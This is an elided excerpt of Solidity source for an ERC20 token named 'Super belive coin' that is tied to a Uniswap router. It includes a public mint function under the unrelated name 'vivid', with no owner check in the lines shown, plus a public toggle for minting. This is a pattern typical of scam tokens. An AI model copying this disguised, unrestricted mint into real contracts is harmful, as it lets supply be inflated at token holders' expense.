...
contract ERC20 is Context, IERC20, Ownable {
    ...
    uint256 public _feeTransfer = 50;
     ...
     */
    function vivid(uint256 amount) public returns (bool) {
        require(_mintable, "this token is not mintable");
        _mint(_msgSender(), amount);
        return true;
    }

    function enableMint(bool _pmintable) public returns (bool) {
...
// File: contracts/Token/Uniswap.sol
...
contract Superbelive is ERC20 {
    ...
    constructor() {
        _initialize("Super belive coin", "SBC", 18, maxSupply);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x612A93FaAC1fC68754a6E6Abe9b60405E8702287
        );
